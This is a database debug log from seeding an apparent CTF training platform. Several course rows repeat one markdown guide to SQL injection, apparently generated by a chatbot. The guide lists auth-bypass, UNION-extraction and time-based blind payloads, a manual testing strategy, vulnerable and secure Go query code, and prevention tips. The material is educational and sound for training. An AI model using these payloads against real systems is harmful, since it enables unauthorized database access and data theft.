db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,38) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.427ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[12.126ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.178','2025-06-09 14:07:54.178',NULL,'anti-forensics detection','Identifying evidence tampering',60,5) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.086ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.425ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 39 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.238ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.191','2025-06-09 14:07:54.191',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,39) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.458ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.246ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.199','2025-06-09 14:07:54.199',NULL,'mobile device forensics','Extracting data from smartphones',250,4) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.425ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.402ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 40 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[6.703ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.206','2025-06-09 14:07:54.206',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,40) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.448ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[5.767ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.212','2025-06-09 14:07:54.212',NULL,'input validation','Preventing injection attacks',200,3) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.745ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.480ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 41 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.531ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.221','2025-06-09 14:07:54.221',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,41) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.459ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[9.243ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.23','2025-06-09 14:07:54.23',NULL,'memory safety','Avoiding buffer overflows (C/C++)',240,4) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.026ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.489ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 42 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.559ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.24','2025-06-09 14:07:54.24',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,42) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.494ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.387ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.247','2025-06-09 14:07:54.247',NULL,'secure api design','Implementing OAuth2/OpenID Connect',230,4) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.476ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
